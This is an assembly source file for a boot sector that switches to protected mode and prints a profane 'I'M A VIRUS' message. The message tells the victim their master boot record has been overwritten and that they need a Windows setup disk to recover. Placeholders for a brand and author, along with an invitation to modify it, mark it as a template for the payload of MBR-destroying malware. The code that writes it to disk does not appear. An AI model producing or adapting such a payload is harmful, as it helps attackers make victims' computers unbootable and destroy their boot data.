; fuck

; copyright [brand] by [author], [minyr]-[maxyr]. Some Right Reserved(TM). MBR by LWYS.

bits 16 ; tell NASM this is 16 bit code
org 0x7c00 ; tell NASM to start outputting stuff at offset 0x7c00

boot:
    mov ax, 0x2401
    int 0x15
	mov ax, 0x3
	int 0x10
	lgdt [gdt_pointer] ; load the gdt table
	mov eax, cr0 
	or eax,0x1 ; set the protected mode bit on special CPU reg cr0
	mov cr0, eax
	jmp CODE_SEG:boot2 ; long jump to the code segment

gdt_start:
    dq 0x0
gdt_code:
    dw 0xFFFF
    dw 0x0
    db 0x0
    db 10011010b
    db 11001111b
    db 0x0
gdt_data:
    dw 0xFFFF
    dw 0x0
    db 0x0
    db 10010010b
    db 11001111b
    db 0x0
gdt_end:

gdt_pointer:
    dw gdt_end - gdt_start
    dd gdt_start
CODE_SEG equ gdt_code - gdt_start
DATA_SEG equ gdt_data - gdt_start

bits 32
boot2:
    mov ax, DATA_SEG
    mov ds, ax
    mov es, ax
    mov fs, ax
    mov gs, ax
    mov ss, ax
	mov esi,info0
    mov ebx,0xb8000
.loop:
    lodsb
    or al,al
    jz halt
    or eax,0x0F00
    mov word [ebx], ax
    add ebx,2
	jmp .loop
halt:
    cli
    hlt	

; a dirty hack; modify it as you want
info0: db "I'M A VIRUS, FUCK YOU =)! (meme from CreeperKong)                               Your MBR was fucked by [brand].                                                 Use your Windows Boot Disk/Setup CD-ROM to fix your system.                     https://youtu.be/_j3tIyRucH0 / https://www.bilibili.com/video/av11067980/",0

times 510 - ($-$$) db 0 ; pad remaining 510 bytes with zeroes
dw 0xaa55 ; magic bootloader magic - marks this 512 byte sector bootable!